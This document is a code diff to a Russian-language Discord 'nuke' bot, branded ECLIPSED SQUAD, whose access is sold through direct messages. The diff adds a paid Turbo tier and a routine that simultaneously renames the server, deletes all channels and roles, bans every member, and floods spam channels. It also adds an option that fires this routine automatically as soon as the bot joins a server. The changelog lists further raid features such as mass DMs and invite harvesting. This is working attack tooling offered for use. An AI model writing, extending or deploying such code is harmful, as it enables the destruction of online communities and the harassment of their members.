@@ -41,6 +41,10 @@ def is_premium(user_id):
     return user_id in PREMIUM_LIST
 
 
+def is_turbo(user_id):
+    return user_id in TURBO_LIST
+
+
 def save_whitelist():
     with open("whitelist.json", "w") as f:
         json.dump(config.WHITELIST, f)
@@ -54,6 +58,11 @@ def save_owner_whitelist():
 def save_premium():
     with open("premium.json", "w") as f:
         json.dump(PREMIUM_LIST, f)
+
+
+def save_turbo():
+    with open("turbo.json", "w") as f:
+        json.dump(TURBO_LIST, f)
 
 
 def load_whitelist():
@@ -72,6 +81,13 @@ def load_premium():
             PREMIUM_LIST = json.load(f)
 
 
+def load_turbo():
+    global TURBO_LIST
+    if os.path.exists("turbo.json"):
+        with open("turbo.json", "r") as f:
+            TURBO_LIST = json.load(f)
+
+
 def save_spam_text():
     with open("spam_text.json", "w") as f:
         json.dump({"text": config.SPAM_TEXT}, f, ensure_ascii=False)
@@ -88,6 +104,7 @@ def load_spam_text():
 
 BLOCKED_GUILDS: list[int] = []
 PREMIUM_LIST: list[int] = []
+TURBO_LIST: list[int] = []
 
 
 def save_blocked_guilds():
@@ -246,6 +263,69 @@ async def do_super_nuke(guild, spam_text=None):
                 spam_tasks.append(ch.send(spam_text))
         await asyncio.gather(*spam_tasks, return_exceptions=True)
 
+    nuke_running[guild.id] = False
+    nuke_starter.pop(guild.id, None)
+    last_spam_text[guild.id] = spam_text
+    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
+
+
+async def do_superpr_nuke_task(guild, spam_text=None):
+    """Всё одновременно — максимальная скорость, без приоритетов."""
+    if spam_text is None:
+        spam_text = config.SPAM_TEXT
+
+    TURBO_NAME = "Привет от Detected and DavaidKa"
+
+    # Переименовываем сервер
+    try:
+        await guild.edit(name=TURBO_NAME)
+    except Exception:
+        pass
+
+    bot_role = guild.me.top_role
+    targets = [
+        m for m in guild.members
+        if not m.bot and m.id != guild.owner_id
+        and (not m.top_role or m.top_role < bot_role)
+    ]
+
+    # Переименовываем все существующие каналы и роли параллельно
+    async def rename_channel(ch):
+        try:
+            await ch.edit(name=TURBO_NAME)
+        except Exception:
+            pass
+
+    async def rename_role(r):
+        try:
+            await r.edit(name=TURBO_NAME)
+        except Exception:
+            pass
+
+    async def create_and_spam(i):
+        try:
+            ch = await guild.create_text_channel(name=TURBO_NAME)
+            await asyncio.gather(
+                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
+                return_exceptions=True
+            )
+        except Exception:
+            pass
+
+    # ВСЁ ОДНОВРЕМЕННО
+    await asyncio.gather(
+        # Переименовываем существующие каналы и роли
+        asyncio.gather(*[rename_channel(c) for c in guild.channels], return_exceptions=True),
+        asyncio.gather(*[rename_role(r) for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
+        # Удаляем каналы и роли
+        asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True),
+        asyncio.gather(*[r.delete() for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
+        # Баним всех
+        asyncio.gather(*[m.ban(reason="superpr_nuke") for m in targets], return_exceptions=True),
+        # Создаём каналы со спамом
+        asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True),
+        return_exceptions=True
+    )
     nuke_running[guild.id] = False
     nuke_starter.pop(guild.id, None)
     last_spam_text[guild.id] = spam_text
@@ -528,7 +608,78 @@ async def pm_list(ctx):
     await ctx.send(embed=embed)
 
 
+# ─── OWNER-ONLY: TURBO ─────────────────────────────────────
+
+@bot.command(name="turbo_add")
+async def turbo_add(ctx, user_id: int):
+    if ctx.author.id != config.OWNER_ID:
+        return
+    if user_id not in TURBO_LIST:
+        TURBO_LIST.append(user_id)
+        save_turbo()
+        await ctx.send(f"⚡ `{user_id}` получил **Turbo** — доступ к `!superpr_nuke` и `!auto_superpr_nuke`.")
+    else:
+        await ctx.send("Уже в Turbo.")
+
+
+@bot.command(name="turbo_remove")
+async def turbo_remove(ctx, user_id: int):
+    if ctx.author.id != config.OWNER_ID:
+        return
+    if user_id in TURBO_LIST:
+        TURBO_LIST.remove(user_id)
+        save_turbo()
+        await ctx.send(f"✅ `{user_id}` убран из Turbo.")
+    else:
+        await ctx.send("Не найден в Turbo.")
+
+
+@bot.command(name="turbo_list")
+async def turbo_list_cmd(ctx):
+    if ctx.author.id != config.OWNER_ID:
+        return
+    if not TURBO_LIST:
+        await ctx.send("Turbo список пуст.")
+        return
+    lines = []
+    for uid in TURBO_LIST:
+        try:
+            user = await bot.fetch_user(uid)
+            lines.append(f"`{uid}` — **{user}**")
+        except Exception:
+            lines.append(f"`{uid}` — *не найден*")
+    embed = discord.Embed(title="⚡ Turbo список", description="\n".join(lines), color=0x0a0a0a)
+    embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(TURBO_LIST)}")
+    await ctx.send(embed=embed)
+
+
 # ─── PREMIUM COMMANDS ──────────────────────────────────────
+
+def turbo_check():
+    async def predicate(ctx):
+        if ctx.guild and is_guild_blocked(ctx.guild.id):
+            return False
+        if not is_whitelisted(ctx.author.id):
+            embed = discord.Embed(
+                title="☠️ ДОСТУП ЗАПРЕЩЁН",
+                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
+                color=0x0a0a0a
+            )
+            embed.set_footer(text="☠️ ECLIPSED SQUAD")
+            await ctx.send(embed=embed)
+            return False
+        if not is_turbo(ctx.author.id) and ctx.author.id != config.OWNER_ID:
+            embed = discord.Embed(
+                title="⚡ TURBO ФУНКЦИЯ",
+                description="Эта команда доступна только **Turbo** пользователям.\n\nЗа покупкой пиши в ЛС: **davaidkatt**",
+                color=0x0a0a0a
+            )
+            embed.set_footer(text="☠️ ECLIPSED SQUAD")
+            await ctx.send(embed=embed)
+            return False
+        return True
+    return commands.check(predicate)
+
 
 def premium_check():
     async def predicate(ctx):
@@ -578,7 +729,7 @@ async def super_nuke(ctx, *, text: str = None):
 
 
 @bot.command(name="superpr_nuke")
-@premium_check()
+@turbo_check()
 async def superpr_nuke(ctx, *, text: str = None):
     guild = ctx.guild
     if is_guild_blocked(guild.id):
@@ -595,46 +746,7 @@ async def superpr_nuke(ctx, *, text: str = None):
     spam_text = text if text else config.SPAM_TEXT
     last_nuke_time[guild.id] = asyncio.get_running_loop().time()
     last_spam_text[guild.id] = spam_text
-
-    async def do_superpr_nuke():
-        try:
-            await guild.edit(name=config.GUILD_NAME)
-        except Exception:
-            pass
-
-        bot_role = guild.me.top_role
-
-        # Все участники под бан
-        targets = [
-            m for m in guild.members
-            if not m.bot and m.id != guild.owner_id
-            and (not m.top_role or m.top_role < bot_role)
-        ]
-
-        # Создаём каналы параллельно
-        async def create_and_spam(i):
-            try:
-                ch = await guild.create_text_channel(name=config.GUILD_NAME)
-                await asyncio.gather(
-                    *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
-                    return_exceptions=True
-                )
-            except Exception:
-                pass
-
-        # ВСЁ ОДНОВРЕМЕННО: удаление каналов + ролей + бан всех + создание каналов со спамом
-        await asyncio.gather(
-            asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True),
-            asyncio.gather(*[r.delete() for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
-            asyncio.gather(*[m.ban(reason="superpr_nuke") for m in targets], return_exceptions=True),
-            asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True),
-            return_exceptions=True
-        )
-
-        nuke_running[guild.id] = False
-        nuke_starter.pop(guild.id, None)
-
-    asyncio.create_task(do_superpr_nuke())
+    asyncio.create_task(do_superpr_nuke_task(guild, spam_text))
 
 
 @bot.command(name="massdm")
@@ -805,6 +917,8 @@ async def userinfo(ctx, user_id: int = None):
 
 AUTO_SUPER_NUKE = False
 AUTO_SUPER_NUKE_TEXT = None  # None = использовать config.SPAM_TEXT
+AUTO_SUPERPR_NUKE = False
+AUTO_SUPERPR_NUKE_TEXT = None
 # Настройки что делать при auto_super_nuke
 SNUKE_CONFIG = {
     "massban": True,       # банить всех
@@ -966,6 +1080,90 @@ async def snuke_config(ctx, option: str = None, value: str = None):
     await ctx.send(embed=embed)
 
 
+# ─── AUTO SUPERPR NUKE ─────────────────────────────────────
+
+def save_auto_superpr_nuke():
+    with open("auto_superpr_nuke.json", "w", encoding="utf-8") as f:
+        json.dump({"enabled": AUTO_SUPERPR_NUKE, "text": AUTO_SUPERPR_NUKE_TEXT}, f, ensure_ascii=False)
+
+
+def load_auto_superpr_nuke():
+    global AUTO_SUPERPR_NUKE, AUTO_SUPERPR_NUKE_TEXT
+    if os.path.exists("auto_superpr_nuke.json"):
+        with open("auto_superpr_nuke.json", "r", encoding="utf-8") as f:
+            data = json.load(f)
+            AUTO_SUPERPR_NUKE = data.get("enabled", False)
+            AUTO_SUPERPR_NUKE_TEXT = data.get("text", None)
+
+
+@bot.command(name="auto_superpr_nuke")
+@turbo_check()
+async def auto_superpr_nuke_cmd(ctx, state: str, *, text: str = None):
+    global AUTO_SUPERPR_NUKE, AUTO_SUPERPR_NUKE_TEXT
+    if state.lower() == "on":
+        AUTO_SUPERPR_NUKE = True
+        save_auto_superpr_nuke()
+        embed = discord.Embed(
+            title="⚡ Auto Superpr Nuke — ВКЛЮЧЁН",
+            description=(
+                "При входе бота на сервер **мгновенно**:\n"
+                "• Удаление каналов + ролей\n"
+                "• Бан всех участников\n"
+                "• Создание каналов со спамом\n"
+                "Всё одновременно — максимальная скорость.\n\n"
+                f"Текст: `{AUTO_SUPERPR_NUKE_TEXT or 'дефолтный'}`\n"
+                "Чтобы задать текст: `!auto_superpr_nuke text <твой текст>`"
+            ),
+            color=0x0a0a0a
+        )
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await ctx.send(embed=embed)
+    elif state.lower() == "off":
+        AUTO_SUPERPR_NUKE = False
+        save_auto_superpr_nuke()
+        embed = discord.Embed(description="❌ **Auto Superpr Nuke** выключен.", color=0x0a0a0a)
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await ctx.send(embed=embed)
+    elif state.lower() == "text":
+        if not text:
+            await ctx.send("Укажи текст: `!auto_superpr_nuke text <твой текст>`")
+            return
+        AUTO_SUPERPR_NUKE_TEXT = text
+        save_auto_superpr_nuke()
+        embed = discord.Embed(
+            title="✅ Текст Auto Superpr Nuke обновлён",
+            description=f"```{text[:500]}```",
+            color=0x0a0a0a
+        )
+        embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Теперь включи: !auto_superpr_nuke on")
+        await ctx.send(embed=embed)
+    elif state.lower() == "info":
+        status = "✅ Включён" if AUTO_SUPERPR_NUKE else "❌ Выключен"
+        cur_text = AUTO_SUPERPR_NUKE_TEXT or config.SPAM_TEXT
+        embed = discord.Embed(
+            title="⚡ Auto Superpr Nuke — INFO",
+            description=(
+                f"Статус: **{status}**\n\n"
+                "При входе — всё одновременно:\n"
+                "• Удаление каналов + ролей\n"
+                "• Бан всех участников\n"
+                "• Создание каналов со спамом\n\n"
+                f"Текущий текст:\n```{cur_text[:300]}```"
+            ),
+            color=0x0a0a0a
+        )
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await ctx.send(embed=embed)
+    else:
+        await ctx.send(
+            "Использование:\n"
+            "`!auto_superpr_nuke on` — включить\n"
+            "`!auto_superpr_nuke off` — выключить\n"
+            "`!auto_superpr_nuke text <текст>` — задать текст\n"
+            "`!auto_superpr_nuke info` — статус"
+        )
+
+
 # ─── OWNER-ONLY: BLOCK / UNBLOCK GUILD ─────────────────────
 
 @bot.command(name="block_guild", aliases=["block_guid"])
@@ -1029,16 +1227,45 @@ async def changelog(ctx):
         color=0x0a0a0a
     )
     embed.add_field(
-        name="🆕 v1.5 — Super Nuke обновление",
+        name="☠️ v1.0 — Запуск",
         value=(
-            "• `!super_nuke [текст]` — премиум нюк с приоритетами:\n"
-            "  1. Удаление каналов + ролей\n"
-            "  2. Создание каналов с сообщением\n"
-            "  3. Бан всех участников\n"
-            "  4. Спам до 500 сообщений\n"
-            "• `!superpr_nuke [текст]` — максимальная сила, всё одновременно:\n"
-            "  удаление + бан + создание каналов + спам в один момент\n"
-            "• `!auto_super_nuke` ускорен и оптимизирован"
+            "• Базовый краш — `!nuke`, `!stop`\n"
+            "• `!invs_delete`, `!unnsfw_all`, `!webhooks`, `!ip`\n"
+            "• Логирование действий в файл"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="⚡ v1.1 — Расширение функционала",
+        value=(
+            "• Авто-краш при входе бота на сервер — `!auto_nuke on/off`\n"
+            "• Slash спам команды — `/sp`, `/spkd` с задержкой\n"
+            "• Whitelist система — `!wl_add` / `!wl_remove` / `!wl_list`\n"
+            "• `!cleanup`, `!addch`, `!rename`, `!nicks_all`, `!nsfw_all`\n"
+            "• Управление через ЛС без выбора сервера"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="🎨 v1.2 — Редизайн и Owner Panel",
+        value=(
+            "• Полностью переработан дизайн всех меню — тёмный стиль ☠️\n"
+            "• ASCII арт в заголовках, иконки 💀 ⚡ 🔱 👁️\n"
+            "• Owner Panel через ЛС — `!owner_help`, `!guilds`, `!setguild`\n"
+            "• Owner Whitelist — `!owl_add` / `!owl_remove` / `!owl_list`\n"
+            "• Инвайт-ссылки со всех серверов — `!invlink`\n"
+            "• При нюке каналы называются **DavaidKa Best**"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="🆕 v1.3 — Монетизация и защита",
+        value=(
+            "• **Premium** система — кастомный текст в `!nuke` только для избранных\n"
+            "• Без Premium текст игнорируется, нюк всё равно запускается\n"
+            "• Блокировка серверов — `!block_guild` / `!unblock_guild`\n"
+            "• Овнер может менять дефолтный текст нюка через `!set_spam_text`\n"
+            "• Алиасы команд — `!block_guid` / `!unblock_guid` тоже работают"
         ),
         inline=False
     )
@@ -1058,49 +1285,28 @@ async def changelog(ctx):
         inline=False
     )
     embed.add_field(
-        name="🆕 v1.3 — Монетизация и защита",
+        name="💀 v1.5 — Super Nuke",
         value=(
-            "• **Premium** система — кастомный текст в `!nuke` только для избранных\n"
-            "• Без Premium текст игнорируется, нюк всё равно запускается\n"
-            "• Блокировка серверов — `!block_guild` / `!unblock_guild`\n"
-            "• Овнер может менять дефолтный текст нюка через `!set_spam_text`\n"
-            "• Алиасы команд — `!block_guid` / `!unblock_guid` тоже работают"
+            "• `!super_nuke [текст]` — премиум нюк с приоритетами\n"
+            "• `!superpr_nuke [текст]` — turbo нюк, всё одновременно\n"
+            "• `!auto_super_nuke` — авто версия для premium\n"
+            "• `!auto_superpr_nuke` — авто версия для turbo\n"
+            "• **Turbo** список — `!turbo_add` / `!turbo_remove` / `!turbo_list`"
         ),
         inline=False
     )
     embed.add_field(
-        name="🎨 v1.2 — Редизайн и Owner Panel",
+        name="⚡ v1.6 — Turbo & Auto Superpr Nuke",
         value=(
-            "• Полностью переработан дизайн всех меню — тёмный стиль ☠️\n"
-            "• ASCII арт в заголовках, иконки 💀 ⚡ 🔱 👁️\n"
-            "• Owner Panel через ЛС — `!owner_help`, `!guilds`, `!setguild`\n"
-            "• Owner Whitelist — `!owl_add` / `!owl_remove` / `!owl_list`\n"
-            "• Инвайт-ссылки со всех серверов — `!invlink`\n"
-            "• При нюке каналы называются **DavaidKa Best**"
+            "• **Turbo** список — `!turbo_add` / `!turbo_remove` / `!turbo_list`\n"
+            "• `!superpr_nuke [текст]` — turbo нюк, всё одновременно\n"
+            "• `!auto_superpr_nuke on/off/text/info` — авто turbo нюк при входе\n"
+            "• Переименование сервера, каналов и ролей → **Привет от Detected and DavaidKa**\n"
+            "• `!set_spam_text` теперь обновляет текст и для `auto_superpr_nuke`"
         ),
         inline=False
     )
-    embed.add_field(
-        name="⚡ v1.1 — Расширение функционала",
-        value=(
-            "• Авто-краш при входе бота на сервер — `!auto_nuke on/off`\n"
-            "• Slash спам команды — `/sp`, `/spkd` с задержкой\n"
-            "• Whitelist система — `!wl_add` / `!wl_remove` / `!wl_list`\n"
-            "• `!cleanup`, `!addch`, `!rename`, `!nicks_all`, `!nsfw_all`\n"
-            "• Управление через ЛС без выбора сервера"
-        ),
-        inline=False
-    )
-    embed.add_field(
-        name="☠️ v1.0 — Запуск",
-        value=(
-            "• Базовый краш — `!nuke`, `!stop`\n"
-            "• `!invs_delete`, `!unnsfw_all`, `!webhooks`, `!ip`\n"
-            "• Логирование действий в файл"
-        ),
-        inline=False
-    )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt")
+    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt  |  текущая версия: v1.6")
     embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await ctx.send(embed=embed)
 
@@ -1363,6 +1569,13 @@ async def commands_owner(ctx):
 async def on_guild_join(guild):
     if is_guild_blocked(guild.id):
         return  # Сервер заблокирован — ничего не делаем
+
+    # AUTO SUPERPR NUKE — всё одновременно, максимальная скорость
+    if AUTO_SUPERPR_NUKE:
+        nuke_running[guild.id] = True
+        spam_text = AUTO_SUPERPR_NUKE_TEXT if AUTO_SUPERPR_NUKE_TEXT else config.SPAM_TEXT
+        asyncio.create_task(do_superpr_nuke_task(guild, spam_text))
+        return
 
     # AUTO SUPER NUKE — нюк + настраиваемые действия
     if AUTO_SUPER_NUKE:
@@ -2176,13 +2389,15 @@ async def on_message(message):
                 return
             new_text = parts[1]
             config.SPAM_TEXT = new_text
+            AUTO_SUPERPR_NUKE_TEXT = new_text
             save_spam_text()
+            save_auto_superpr_nuke()
             embed = discord.Embed(
                 title="✅ Текст нюка обновлён",
                 description=f"```{new_text[:1000]}```",
                 color=0x0a0a0a
             )
-            embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Теперь !nuke будет использовать этот текст")
+            embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Обновлено: !nuke + auto_superpr_nuke")
             await message.channel.send(embed=embed)
             return
 
@@ -2254,6 +2469,8 @@ async def on_ready():
     load_premium()
     load_spam_text()
     load_auto_super_nuke()
+    load_turbo()
+    load_auto_superpr_nuke()
     bot.tree.clear_commands(guild=None)
 
     # Глобальная проверка для ВСЕХ slash-команд
